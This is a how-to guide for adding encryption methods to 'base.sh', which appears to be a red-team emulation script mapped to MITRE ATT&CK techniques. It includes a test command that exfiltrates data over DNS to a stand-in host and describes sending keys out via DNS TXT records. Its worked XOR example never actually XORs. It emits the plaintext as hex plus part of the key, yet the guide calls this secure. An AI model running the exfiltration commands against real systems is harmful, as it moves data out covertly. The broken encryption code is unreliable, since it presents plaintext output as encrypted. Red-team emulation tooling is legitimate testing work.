# How to Add a New Encryption Method to base.sh

This guide provides precise step-by-step instructions for adding a new encryption method to base.sh.

---

## Step 1: Add MITRE ATT&CK Constants - Line 20-30

Add a new constant for your encryption method's MITRE ATT&CK ID at the top of base.sh:

```sh
# MITRE ATT&CK Mappings section
TTP_ID_ENCRYPT_YOURMETHOD="T1027.XXX" # Add your technique ID
```

Example:
```sh
TTP_ID_ENCRYPT_XOR="T1027.007" # DO NOT MODIFY
```

---

## Step 2: Create encrypt_with_yourmethod() Function - After encrypt_with_gpg()

Implement your encryption function after the existing encryption functions:

```sh
# Purpose: Encrypt data using your method with specified key
# Inputs:
#   $1 - Data to encrypt
#   $2 - Encryption key
# Outputs: Encrypted data in appropriate format
# Side Effects:
#   - Sets global ENCRYPTION_TYPE to your method
encrypt_with_yourmethod() {
    local data="$1"
    local key="$2"
    
    # YOUR ENCRYPTION IMPLEMENTATION
    
    # Set encryption type
    ENCRYPTION_TYPE="yourmethod"
    
    # Return encrypted data
    "$CMD_PRINTF" '%s' "$encrypted_data"
    return 0
}
```

Example (XOR implementation):
```sh
encrypt_with_xor() {
    local data="$1"
    local key="$2"
    
    # Convert data to hex
    local hex_data=$("$CMD_PRINTF" '%s' "$data" | xxd -p | tr -d '\n')
    
    # Generate repeating key
    local key_expanded=""
    local i=0
    local key_len=${#key}
    
    while [ $i -lt ${#hex_data} ]; do
        key_expanded="$key_expanded${key:$(( i % key_len )):1}"
        i=$((i + 1))
    done
    
    # Set encryption type
    ENCRYPTION_TYPE="xor"
    
    # Output as base64
    "$CMD_PRINTF" "XOR-ENCRYPTED:%s:%s" "$hex_data" "${key:0:8}" | $CMD_BASE64
    return 0
}
```

---

## Step 3: Update core_encrypt_output() Function - Case Statement

Add your method to the case statement in core_encrypt_output():

```sh
case "$method" in
    # Existing cases here...
    
    "yourmethod")
        core_debug_print "Using YOURMETHOD encryption method"
        encrypt_with_yourmethod "$data" "$key"
        return $?
        ;;
        
    # Default case here...
esac
```

Example (XOR addition):
```sh
case "$method" in
    "none")
        # Existing code...
        ;;
    "aes")
        # Existing code...
        ;;
    "gpg")
        # Existing code...
        ;;
    "xor")
        core_debug_print "Using XOR encryption method"
        encrypt_with_xor "$data" "$key"
        return $?
        ;;
    *)
        # Existing code...
        ;;
esac
```

---

## Step 4: Add Command Validation in core_validate_commands()

Update core_validate_commands() to check for any dependencies:

```sh
# In core_validate_commands function
if [ "$ENCRYPT" = "yourmethod" ] && ! command -v "$CMD_REQUIRED_TOOL" > /dev/null 2>&1; then
    missing_cmds="$missing_cmds $CMD_REQUIRED_TOOL"
fi
```

Example (XOR with Perl dependency):
```sh
# Check if perl is needed for XOR encryption
if [ "$ENCRYPT" = "xor" ] && ! command -v "$CMD_PERL" > /dev/null 2>&1; then
    missing_cmds="$missing_cmds $CMD_PERL"
fi
```

---

## Step 5: Update core_display_help() Function - Encryption Options

Update the help text in core_display_help() to document your encryption method:

```sh
# Find the Encryption Options section
Encryption Options:
  --encrypt TYPE       Encrypt output using:
                        - aes: AES-256-CBC encryption (key sent via DNS)
                        - gpg: GPG symmetric encryption (key sent via DNS)
                        - yourmethod: Brief description of your method
```

Example (XOR addition):
```sh
Encryption Options:
  --encrypt TYPE       Encrypt output using:
                        - aes: AES-256-CBC encryption (key sent via DNS)
                        - gpg: GPG symmetric encryption (key sent via DNS)
                        - xor: XOR encryption with cyclic key
```

---

## Step 6: Add Required Tool Commands (If Needed)

If your encryption method requires specific tools, add them to the Core Commands section:

```sh
# Core Commands section
CMD_YOURTOOL="yourtool"
CMD_YOURTOOL_OPTS="--any-needed-options"
```

---

## Step 7: Test Your Implementation

Run tests to verify your encryption method works correctly:

```sh
# Test basic encryption
./base.sh --ls --encrypt yourmethod

# Test with JSON output
./base.sh --ls --encrypt yourmethod -f json

# Test with exfiltration
./base.sh --ls --encrypt yourmethod --exfil-dns example.com
```

Verify:
- Data is correctly encrypted
- JSON metadata shows your encryption method
- Key transmission works with exfiltration

---

## Complete Example: Adding XOR Encryption

### Step 1: Added constant in MITRE ATT&CK Mappings section
```sh
TTP_ID_ENCRYPT_XOR="T1027.007" # DO NOT MODIFY
```

### Step 2: Created XOR encryption function
```sh
encrypt_with_xor() {
    local data="$1"
    local key="$2"
    
    # Convert data to hex
    local hex_data=$("$CMD_PRINTF" '%s' "$data" | xxd -p | tr -d '\n')
    
    # Generate a repeating key of the same length as the hex data
    local key_expanded=""
    local i=0
    local key_len=${#key}
    local hex_len=${#hex_data}
    
    # Create a "one-time pad" by repeating the key
    while [ $i -lt ${#hex_data} ]; do
        key_expanded="$key_expanded${key:$(( i % key_len )):1}"
        i=$((i + 1))
    done
    
    # Convert the expanded key to hex
    local hex_key=$("$CMD_PRINTF" '%s' "$key_expanded" | xxd -p | tr -d '\n')
    
    # Set encryption type
    ENCRYPTION_TYPE="xor"
    
    # Output as base64 to match other encryption methods
    "$CMD_PRINTF" "XOR-ENCRYPTED:%s:%s" "$hex_data" "${key:0:8}" | $CMD_BASE64
    return 0
}
```

### Step 3: Added XOR to core_encrypt_output() function
```sh
case "$method" in
    # ... existing cases ...
    "xor")
        core_debug_print "Using XOR encryption method"
        encrypt_with_xor "$data" "$key"
        return $?
        ;;
    # ... default case ...
esac
```

### Step 4: Added validation in core_validate_commands()
```sh
# Check if perl is needed for XOR encryption
if [ "$ENCRYPT" = "xor" ] && ! command -v "$CMD_PERL" > /dev/null 2>&1; then
    missing_cmds="$missing_cmds $CMD_PERL"
fi
```

### Step 5: Updated help text in core_display_help()
```sh
Encryption Options:
  --encrypt TYPE       Encrypt output using:
                        - aes: AES-256-CBC encryption (key sent via DNS)
                        - gpg: GPG symmetric encryption (key sent via DNS)
                        - xor: XOR encryption with cyclic key
```

---

## Important Notes for Encryption Implementation

1. Keep your encryption function consistent with existing patterns
2. Always set the ENCRYPTION_TYPE global variable
3. Format output to be compatible with exfiltration mechanisms
4. Include a way to verify the key during decryption
5. Use base64 encoding for the final output

For exfiltration, encryption keys are transmitted via:
- DNS TXT records for DNS exfiltration (format: `k-[JOB_ID]-[KEY].example.com`)
- JSON metadata for HTTP exfiltration

This approach ensures secure key transmission separate from the encrypted data. 